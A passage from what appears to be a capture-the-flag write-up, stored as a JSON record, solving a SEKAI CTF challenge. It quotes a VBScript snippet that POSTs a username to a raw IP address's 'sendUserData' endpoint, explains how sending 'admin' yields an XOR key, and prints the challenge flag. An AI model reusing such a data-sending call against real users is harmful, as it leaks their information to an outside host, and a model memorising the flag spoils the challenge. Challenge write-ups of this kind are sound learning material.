\"http://20.106.250.46/sendUserData\" With http  Call .Open(\"POST\", url, False)  Call .SetRequestHeader(\"Content-Type\", \"application/json\")  Call .Send(\"{\"\"username\"\":\"\"\" &amp; strUser &amp; \"\"\"}\") End With res = Msgbox(\"Thank you for your cooperation!\", vbOKOnly+vbInformation, \"\")From above snippet, it seems that POST request is to be sent to the given URL, after setting request header Content-Type to application/json and sending json payload {   \"username\":\"admin\" }   I set username to admin and bravo !! I got the key..So with the key we XORed the downloaded XORed flag.png and yesss.. we got the flag !! Flag :- SEKAI{so_i_guess_we'll_get_more_better_next_year-_-}"
  }
  
]

